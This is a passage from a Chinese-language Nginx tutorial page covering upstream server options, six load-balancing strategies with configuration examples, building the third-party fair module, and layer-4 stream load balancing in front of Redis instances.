class="hljs-literal">--</span><span class="hljs-comment">remove</span><span class="hljs-literal">-</span><span class="hljs-comment">port=9003/tcp</span><br></code></pre></td></tr></table></figure><p>重新加载</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">firewall-cmd <span class="hljs-comment">--reload</span><br></code></pre></td></tr></table></figure><p>其中</p><p>​ --permanent表示设置为持久</p><p>​ --add-port表示添加指定端口</p><p>​ --remove-port表示移除指定端口</p><h5 id="max_conns"><a class="markdownIt-Anchor" href="#max_conns"></a> max_conns</h5><p>max_conns=number:用来设置代理服务器同时活动链接的最大数量，默认为0，表示不限制，使用该配置可以根据后端服务器处理请求的并发量来进行设置，防止后端服务器被压垮。</p><h5 id="max_fails和fail_timeout"><a class="markdownIt-Anchor" href="#max_fails和fail_timeout"></a> max_fails和fail_timeout</h5><p>max_fails=number:设置允许请求代理服务器失败的次数，默认为1。</p><p>fail_timeout=time:设置经过max_fails失败后，服务暂停的时间，默认是10秒。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.133:9001</span> down;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.133:9002</span> backup;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.133:9003</span> max_fails=<span class="hljs-number">3</span> fail_timeout=<span class="hljs-number">15</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="负载均衡策略"><a class="markdownIt-Anchor" href="#负载均衡策略"></a> 负载均衡策略</h4><p>介绍完Nginx负载均衡的相关指令后，我们已经能实现将用户的请求分发到不同的服务器上，那么除了采用默认的分配方式以外，我们还能采用什么样的负载算法?</p><p>Nginx的upstream支持如下六种方式的分配算法，分别是:</p><table><thead><tr><th>算法名称</th><th>说明</th></tr></thead><tbody><tr><td>轮询</td><td>默认方式</td></tr><tr><td>weight</td><td>权重方式</td></tr><tr><td>ip_hash</td><td>依据ip分配方式</td></tr><tr><td>least_conn</td><td>依据最少连接方式</td></tr><tr><td>url_hash</td><td>依据URL分配方式</td></tr><tr><td>fair</td><td>依据响应时间方式</td></tr></tbody></table><h5 id="轮询"><a class="markdownIt-Anchor" href="#轮询"></a> 轮询</h5><p>是upstream模块负载均衡默认的策略。每个请求会按时间顺序逐个分配到不同的后端服务器。轮询不需要额外的配置。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> weight=<span class="hljs-number">1</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="weight加权加权轮询"><a class="markdownIt-Anchor" href="#weight加权加权轮询"></a> weight加权[加权轮询]</h5><p>weight=number:用来设置服务器的权重，默认为1，权重数据越大，被分配到请求的几率越大；该权重值，主要是针对实际工作环境中不同的后端服务器硬件配置进行调整的，所有此策略比较适合服务器的硬件配置差别比较大的情况。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> weight=<span class="hljs-number">10</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span> weight=<span class="hljs-number">5</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span> weight=<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ip_hash"><a class="markdownIt-Anchor" href="#ip_hash"></a> ip_hash</h5><p>当对后端的多台动态应用服务器做负载均衡时，ip_hash指令能够将某个客户端IP的请求通过哈希算法定位到同一台后端服务器上。这样，当来自某一个IP的用户在后端Web服务器A上登录后，在访问该站点的其他URL，能保证其访问的还是后端web服务器A。</p><table><thead><tr><th>语法</th><th>ip_hash;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>upstream</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">upstream backend&#123;<br>ip_hash;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9001</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9002</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9003</span>;<br>&#125;<br><span class="hljs-keyword">server</span> &#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8083</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> /&#123;<br>proxy_pass http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要额外多说一点的是使用ip_hash指令无法保证后端服务器的负载均衡，可能导致有些后端服务器接收到的请求多，有些后端服务器接收的请求少，而且设置后端服务器权重等方法将不起作用。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591706748677.png" alt="1591706748677" /></p><h5 id="least_conn"><a class="markdownIt-Anchor" href="#least_conn"></a> least_conn</h5><p>最少连接，把请求转发给连接数较少的后端服务器。轮询算法是把请求平均的转发给各个后端，使它们的负载大致相同；但是，有些请求占用的时间很长，会导致其所在的后端负载较高。这种情况下，least_conn这种方式就可以达到更好的负载均衡效果。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">upstream backend&#123;<br>least_conn;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9001</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9002</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9003</span>;<br>&#125;<br><span class="hljs-keyword">server</span> &#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8083</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> /&#123;<br>proxy_pass http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此负载均衡策略适合请求处理时间长短不一造成服务器过载的情况。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591809623736.png" alt="1591809623736" /></p><h5 id="url_hash"><a class="markdownIt-Anchor" href="#url_hash"></a> url_hash</h5><p>按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，要配合缓存命中来使用。同一个资源多次请求，可能会到达不同的服务器上，导致不必要的多次下载，缓存命中率不高，以及一些资源时间的浪费。而使用url_hash，可以使得同一个url（也就是同一个资源请求）会到达同一台服务器，一旦缓存住了资源，再此收到请求，就可以从缓存中读取。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">hash</span> &amp;request_uri;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问如下地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8083</span>/a<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8083</span>/b<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8083</span>/c<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591812222306.png" alt="1591812222306" /></p><h5 id="fair"><a class="markdownIt-Anchor" href="#fair"></a> fair</h5><p>fair采用的不是内建负载均衡使用的轮换的均衡算法，而是可以根据页面大小、加载时间长短智能的进行负载均衡。那么如何使用第三方模块的fair负载均衡策略。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">upstream backend&#123;<br>fair;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9001</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9002</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9003</span>;<br>&#125;<br><span class="hljs-keyword">server</span> &#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8083</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> /&#123;<br>proxy_pass http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是如何直接使用会报错，因为fair属于第三方模块实现的负载均衡。需要添加<code>nginx-upstream-fair</code>,如何添加对应的模块:</p><ol><li>下载nginx-upstream-fair模块</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址为:<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gnosek/</span>nginx-upstream-fair<br></code></pre></td></tr></table></figure><ol start="2"><li>将下载的文件上传到服务器并进行解压缩</li></ol><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">unzip nginx-upstream-fair-<span class="hljs-literal">master</span>.zip<br></code></pre></td></tr></table></figure><ol start="3"><li>重命名资源</li></ol><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">mv nginx-upstream-fair-<span class="hljs-keyword">master</span> <span class="hljs-title">fair</span><br></code></pre></td></tr></table></figure><ol start="4"><li>使用./configure命令将资源添加到Nginx模块中</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">./configure --add-<span class="hljs-variable language_">module</span>=<span class="hljs-regexp">/root/</span>fair<br></code></pre></td></tr></table></figure><ol start="5"><li>编译</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure><p>编译可能会出现如下错误，ngx_http_upstream_srv_conf_t结构中缺少default_port</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584941470457.png" alt="1584941470457" /></p><p>解决方案:</p><p>在Nginx的源码中 src/http/ngx_http_upstream.h,找到<code>ngx_http_upstream_srv_conf_s</code>，在模块中添加添加default_port属性</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">in_port_t</span>   default_<span class="hljs-keyword">port</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584943399597.png" alt="1584943399597" /></p><p>然后再进行make.</p><ol start="6"><li>更新Nginx</li></ol><p>​ 6.1 将sbin目录下的nginx进行备份</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<span class="hljs-regexp">/nginx /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/sbin/</span>nginxold<br></code></pre></td></tr></table></figure><p>​6.2 将安装目录下的objs中的nginx拷贝到sbin目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd objs<br>cp nginx <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br></code></pre></td></tr></table></figure><p>​ 6.3 更新Nginx</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">cd</span></span> ../<br>make upgrade<br></code></pre></td></tr></table></figure><ol start="7"><li>编译测试使用Nginx</li></ol><p>上面介绍了Nginx常用的负载均衡的策略，有人说是5种，是把轮询和加权轮询归为一种，也有人说是6种。那么在咱们以后的开发中到底使用哪种，这个需要根据实际项目的应用场景来决定的。</p><h4 id="负载均衡案例"><a class="markdownIt-Anchor" href="#负载均衡案例"></a> 负载均衡案例</h4><h5 id="案例一对所有请求实现一般轮询规则的负载均衡"><a class="markdownIt-Anchor" href="#案例一对所有请求实现一般轮询规则的负载均衡"></a> 案例一：对所有请求实现一般轮询规则的负载均衡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="案例二对所有请求实现加权轮询规则的负载均衡"><a class="markdownIt-Anchor" href="#案例二对所有请求实现加权轮询规则的负载均衡"></a> 案例二：对所有请求实现加权轮询规则的负载均衡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> weight=<span class="hljs-number">7</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span> weight=<span class="hljs-number">5</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span> weight=<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="案例三对特定资源实现负载均衡"><a class="markdownIt-Anchor" href="#案例三对特定资源实现负载均衡"></a> 案例三：对特定资源实现负载均衡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> videobackend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br>&#125;<br><span class="hljs-section">upstream</span> filebackend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9004</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8084</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /video/ &#123;<br><span class="hljs-attribute">proxy_pass</span> http://videobackend;<br>&#125;<br><span class="hljs-section">location</span> /file/ &#123;<br><span class="hljs-attribute">proxy_pass</span> http://filebackend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="案例四对不同域名实现负载均衡"><a class="markdownIt-Anchor" href="#案例四对不同域名实现负载均衡"></a> 案例四：对不同域名实现负载均衡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> itcastbackend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br>&#125;<br><span class="hljs-section">upstream</span> itheimabackend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9004</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">8085</span>;<br><span class="hljs-attribute">server_name</span> www.itcast.cn;<br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://itcastbackend;<br>&#125;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">8086</span>;<br><span class="hljs-attribute">server_name</span> www.itheima.cn;<br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://itheimabackend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="案例五实现带有url重写的负载均衡"><a class="markdownIt-Anchor" href="#案例五实现带有url重写的负载均衡"></a> 案例五：实现带有URL重写的负载均衡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>; <br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /file/ &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(/file/.*)</span> /server/<span class="hljs-variable">$1</span> <span class="hljs-literal">last</span>;<br>&#125;<br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="nginx四层负载均衡"><a class="markdownIt-Anchor" href="#nginx四层负载均衡"></a> Nginx四层负载均衡</h3><p>Nginx在1.9之后，增加了一个stream模块，用来实现四层协议的转发、代理、负载均衡等。stream模块的用法跟http的用法类似，允许我们配置一组TCP或者UDP等协议的监听，然后通过proxy_pass来转发我们的请求，通过upstream添加多个后端服务，实现负载均衡。</p><p>四层协议负载均衡的实现，一般都会用到LVS、HAProxy、F5等，要么很贵要么配置很麻烦，而Nginx的配置相对来说更简单，更能快速完成工作。</p><h4 id="添加stream模块的支持"><a class="markdownIt-Anchor" href="#添加stream模块的支持"></a> 添加stream模块的支持</h4><p>Nginx默认是没有编译这个模块的，需要使用到stream模块，那么需要在编译的时候加上<code>--with-stream</code>。</p><p>完成添加<code>--with-stream</code>的实现步骤:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">将原有/usr/local/nginx/sbin/nginx进行备份</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">拷贝nginx之前的配置信息</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">在nginx的安装源码进行配置指定对应模块  ./configure --with-stream</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">通过make模板进行编译</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">将objs下面的nginx移动到/usr/local/nginx/sbin下</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">在源码目录下执行  make upgrade进行升级，这个可以实现不停机添加新模块的功能</span><br></code></pre></td></tr></table></figure><h4 id="nginx四层负载均衡的指令"><a class="markdownIt-Anchor" href="#nginx四层负载均衡的指令"></a> Nginx四层负载均衡的指令</h4><h5 id="stream指令"><a class="markdownIt-Anchor" href="#stream指令"></a> stream指令</h5><p>该指令提供在其中指定流服务器指令的配置文件上下文。和http指令同级。</p><table><thead><tr><th>语法</th><th>stream { … }</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>main</td></tr></tbody></table><h5 id="upstream指令-2"><a class="markdownIt-Anchor" href="#upstream指令-2"></a> upstream指令</h5><p>该指令和http的upstream指令是类似的。</p><h4 id="四层负载均衡的案例"><a class="markdownIt-Anchor" href="#四层负载均衡的案例"></a> 四层负载均衡的案例</h4><h5 id="需求分析"><a class="markdownIt-Anchor" href="#需求分析"></a> 需求分析</h5><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591897178807.png" alt="1591897178807" /></p><p>实现步骤</p><p>(1)准备Redis服务器,在一条服务器上准备三个Redis，端口分别是6379,6378</p><p>1.上传redis的安装包，<code>redis-4.0.14.tar.gz</code></p><p>2.将安装包进行解压缩</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxf redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14</span>.tar.gz<br></code></pre></td></tr></table></figure><p>3.进入redis的安装包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><p>4.使用make和install进行编译和安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">make PREFIX=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis01 install<br></code></pre></td></tr></table></figure><p>5.拷贝redis配置文件<code>redis.conf</code>到/usr/local/redis/redis01/bin目录中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp redis.conf<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis01/bin<br></code></pre></td></tr></table></figure><p>6.修改redis.conf配置文件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">port</span>  <span class="hljs-number">6379</span>      <span class="hljs-comment">#redis的端口</span><br>daemonize <span class="hljs-literal">yes</span>   <span class="hljs-comment">#后台启动redis</span><br></code></pre></td></tr></table></figure><p>7.将redis01复制一份为redis02</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/local/redis<br><span class="hljs-built_in">cp</span> -r redis01 redis02<br></code></pre></td></tr></table></figure><p>8.将redis02文件文件夹中的redis.conf进行修改</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">port</span>  <span class="hljs-number">6378</span>      <span class="hljs-comment">#redis的端口</span><br>daemonize <span class="hljs-literal">yes</span>   <span class="hljs-comment">#后台启动redis</span><br></code></pre></td></tr></table></figure><p>9.分别启动，即可获取两个Redis.并查看</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> 